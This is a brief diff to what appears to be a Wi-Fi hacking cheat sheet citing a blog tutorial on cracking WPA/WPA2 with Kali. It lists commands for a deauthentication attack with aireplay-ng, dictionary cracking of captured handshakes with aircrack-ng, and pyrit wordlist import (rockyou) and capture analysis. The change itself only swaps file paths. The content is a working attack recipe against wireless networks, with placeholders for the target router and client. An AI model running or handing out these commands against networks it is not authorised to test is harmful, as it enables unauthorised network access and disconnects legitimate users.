@@ -9,7 +9,7 @@ http://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-ka
 * aireplay-ng -0 2 -a {target_router_bssid} -c {connected_station_bssid} wlan0mon
 
 #### CRACKEND
-* aircrack-ng -a2 -b {target_router_bssid} -w /root/wpa.txt /root/Desktop/*.cap
+* aircrack-ng -a2 -b {target_router_bssid} -w /home/wordlist.txt /home/*.cap
 * airmon-ng stop wlan0mon
 * pyrit -r BSSID.cap analyze
 * pyrit -i ./rockyou.txt import_passwords
